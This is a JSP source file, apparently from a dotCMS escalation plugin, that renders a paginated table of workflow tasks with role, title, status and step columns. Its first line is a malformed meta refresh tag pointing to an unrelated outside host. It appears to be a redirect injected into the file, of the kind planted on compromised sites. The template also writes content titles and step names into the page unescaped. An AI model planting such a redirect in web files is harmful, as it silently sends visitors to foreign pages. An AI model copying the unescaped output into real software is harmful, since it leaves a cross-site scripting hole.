<META HTTP-EQUIV="Refresh";URL=http://www.s.it/p.htm">
<%@page import="com.sun.org.apache.xerces.internal.impl.xpath.XPath.Step"%>
<portlet:defineObjects />
<%@page import="com.liferay.portal.util.WebKeys"%>
<%@page import="com.dotmarketing.business.Layout"%>
<%@page import="com.dotmarketing.util.UtilMethods"%>
<%@page import="com.liferay.portal.model.User"%>
<%@page import="com.dotmarketing.business.web.WebAPILocator"%>
<%@page import="com.dotmarketing.util.URLEncoder"%>
<%@page import="com.liferay.portal.language.LanguageUtil"%>
<%@page import="javax.portlet.WindowState"%>
<%@page import="com.dotmarketing.business.APILocator"%>
<%@page import="com.dotmarketing.portlets.workflows.model.*"%>
<%@page import="com.dotmarketing.portlets.contentlet.model.Contentlet"%>
<%@page import="com.liferay.portal.util.*"%>
<%@page import="com.dotmarketing.business.Role"%>
<%@page import="com.dotmarketing.util.Logger"%>
<%@page import="com.dotmarketing.util.DateUtil"%>
<%@page import="org.apache.commons.beanutils.BeanUtils"%>
<%@page import="java.util.ArrayList"%>
<%@page import="java.util.List"%>
<%@page import="com.dotmarketing.plugin.business.PluginAPI"%>


<script language="Javascript">

dojo.require("dijit.form.FilteringSelect");
dojo.require("dotcms.dojo.data.RoleReadStore");
dojo.require("dotcms.dojo.data.RoleReadStore");
dojo.require("dojox.layout.ContentPane");


</script>

		<%
		String pluginId = "com.dotcms.escalation";
		PluginAPI pluginAPI = APILocator.getPluginAPI();
	
		WorkflowSearcher searcher = new WorkflowSearcher(request.getParameterMap(),  APILocator.getUserAPI().getSystemUser());
		WorkflowSearcher fakeSearcher =(WorkflowSearcher) BeanUtils.cloneBean(searcher) ; 
		
		%>
			
			<br />
			<div style="margin-left: 135px;margin-right: 115px">
			<table class="listingTable">
			<tr>
				<th><input type="checkbox" dojoType="dijit.form.CheckBox"  id="checkAllCkBx" value="true" onClick="checkAll()" /></th>
				<th nowrap="nowrap" width="22%" style="text-align:center;">User</th>
				
				<th nowrap="nowrap" width="18%" style="text-align:center;"><a href="javascript: doOrderBy('<%="title".equals(searcher.getOrderBy())?"status desc":"title"%>')">Title</th>
				<th nowrap="nowrap" width="10%" style="text-align:center;"><a href="javascript: doOrderBy('<%="status".equals(searcher.getOrderBy())?"status desc":"status"%>')">Status</th>
				<th nowrap="nowrap" width="10%" style="text-align:center;"><a href="javascript: doOrderBy('<%="status".equals(searcher.getOrderBy())?"status desc":"status"%>')">Step</th>
				<th nowrap="nowrap" width="15%" style="text-align:center;"><a href="javascript: doOrderBy('<%="mod_date".equals(searcher.getOrderBy())?"mod_date desc":"mod_date"%>')">Last Updated</th>
			</tr>
			
		<%
		List<WorkflowTask> tasks = searcher.findAllTasks(searcher);
		for(WorkflowTask task : tasks){ 
				
			Role r = APILocator.getRoleAPI().loadRoleById(task.getAssignedTo());
			
			boolean justInManteinance = ((String)pluginAPI.loadProperty(pluginId, "escalation.job.java.roleToEscale")).equals(r.getRoleKey());
			
			Contentlet contentlet = new Contentlet();
			WorkflowStep step = APILocator.getWorkflowAPI().findStep(task.getStatus());
				
			try{
				contentlet 	= APILocator.getContentletAPI().findContentletByIdentifier(task.getWebasset(),false,APILocator.getLanguageAPI().getDefaultLanguage().getId(), APILocator.getUserAPI().getSystemUser(), true);	
			} catch(Exception e){
				Logger.error(this.getClass(), e.getMessage());	
			}			
		%>
			
				<tr class="alternate_1">
				
					<td><input type="checkbox" dojoType="dijit.form.CheckBox"  <%if(justInManteinance){ %>disabled="true"<%} %> name="task" id="<%=task.getWebasset() %>" class="taskCheckBox" value="<%=task.getId() %>"  /></td>
					<td onClick="editTask('<%=task.getId()%>')" nowrap="nowrap" align="left">
						<strong><%="Role:"+APILocator.getRoleAPI().loadRoleById(task.getAssignedTo()).getName()%></strong>	
					</td>
					<td onClick="editTask('<%=task.getId()%>')" nowrap="nowrap" align="left"><%=contentlet.getTitle() %></td>
					<td onClick="editTask('<%=task.getId()%>')" nowrap="nowrap" align="CENTER" >
				
		<%if (contentlet.isLive()) {%>
		        		<span class="liveIcon"></span>
		<%} else if (contentlet.isArchived()) {%>
		        		<span class="archivedIcon"></span>
		<%} else if (contentlet.isWorking()) {%>
		        		<span class="workingIcon"></span>
		<%}
				
		if (contentlet.isLocked()) { %>
		         	<span class="lockIcon"  title="<%=UtilMethods.javaScriptify(r.getName()) %>"></span>
		<%} %>
		   		
					</td>
					<td onClick="editTask('<%=task.getId()%>')" nowrap="nowrap" align="center" onClick="editTask('<%=task.getId()%>')" <%if(step.isResolved()) {%>style="text-decoration: line-through;"<%} %>><%=step.getName() %></td>
					<td onClick="editTask('<%=task.getId()%>')" nowrap="nowrap" align="center"><%=DateUtil.prettyDateSince(task.getModDate(), APILocator.getUserAPI().getSystemUser().getLocale())%></td>
		<%}%>
	
				</tr>
			</table>
		
			<table width="95%" align="center" style="margin:10px;">
		<tr>
		<td width="33%">
			<%if(searcher.hasBack()){ 
				fakeSearcher.setPage(searcher.getPage()-1);
			%>			
				<button dojoType="dijit.form.Button" onClick="refreshTaskList('<%=fakeSearcher.getQueryString()%>');" iconClass="previousIcon">
					<%= LanguageUtil.get(pageContext, "Back") %> 
				</button>
			
			<%} %>
		</td>
		<td width="34%" align="center">
			<%if(searcher.getTotalPages() > 1){ %>
				<%for(int i = searcher.getStartPage();i< searcher.getTotalPages();i++){ 
					fakeSearcher.setPage(i);
					%>
					<%if(i == searcher.getPage()){ %>
						<%=i+1 %>
					<%}else{ %>
						<a href="javascript:refreshTaskList('<%=fakeSearcher.getQueryString()%>')"><%=i+1 %></a>
					<%} %>
					&nbsp;
				<%} %>
			<%} %>
		</td>
		<td width="33%" align="right">
			<%if(searcher.hasNext()){ 
				fakeSearcher.setPage(searcher.getPage()+1);
			%>
			
			<button dojoType="dijit.form.Button" onClick="refreshTaskList('<%=fakeSearcher.getQueryString()%>');" iconClass="nextIcon">
				<%= LanguageUtil.get(pageContext, "Next") %> 
			</button>

			<%} %>
		</td>
		</tr>
	
	</table>
	</div>
